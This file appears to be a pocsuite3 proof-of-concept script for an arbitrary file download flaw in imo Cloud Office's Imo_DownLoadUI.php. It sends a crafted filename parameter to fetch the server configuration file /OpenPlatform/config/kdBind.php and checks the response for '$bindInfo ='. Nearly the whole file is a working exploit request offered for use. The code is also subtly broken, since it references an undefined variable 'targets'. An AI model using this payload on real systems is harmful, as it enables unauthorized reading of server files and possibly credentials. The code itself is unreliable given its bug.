from lib2to3.pgen2 import token
from pocsuite3.lib.core.data import logger
from collections import OrderedDict
from urllib.parse import urljoin
from requests.exceptions import ReadTimeout
from pocsuite3.api import get_listener_ip, get_listener_port, random_str
from pocsuite3.api import Output, POCBase, POC_CATEGORY, register_poc, requests, REVERSE_PAYLOAD, OptString, OptItems, OptDict, VUL_TYPE
from pocsuite3.lib.utils import get_middle_text
from requests.packages.urllib3.exceptions import InsecureRequestWarning

class DemoPOC(POCBase):
    vulID = '8'  
    name = 'imo 云办公室 Imo_DownLoadUI.php 任意文件下载漏洞'
    desc = '''imo 云办公室 Imo_DownLoadUI.php imo 云办公室'''
    appPowerLink = 'imo 云办公室 imo 云办公室'
    appName = 'imo 云办公室'
    appVersion = '*'
    samples = []
    install_requires = ['']
    vulType = VUL_TYPE.PATH_DISCLOSURE
    category = POC_CATEGORY.EXPLOITS.WEBAPP

    def _verify(self):
        result = {}
        target = self.url + "/file/Placard/upload/Imo_DownLoadUI.php?cid=1&uid=1&type=1&filename=/OpenPlatform/config/kdBind.php"
        try:
            r = requests.get(target, timeout=5,verify=False)
            if r.status_code == 200 and '$bindInfo =' in r.text:
                result['VerifyInfo'] = {}
                result['VerifyInfo']['URL'] = targets
        except:
            pass

        return self.parse_output(result)

    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('target is not vulnerable')
        return output


register_poc(DemoPOC)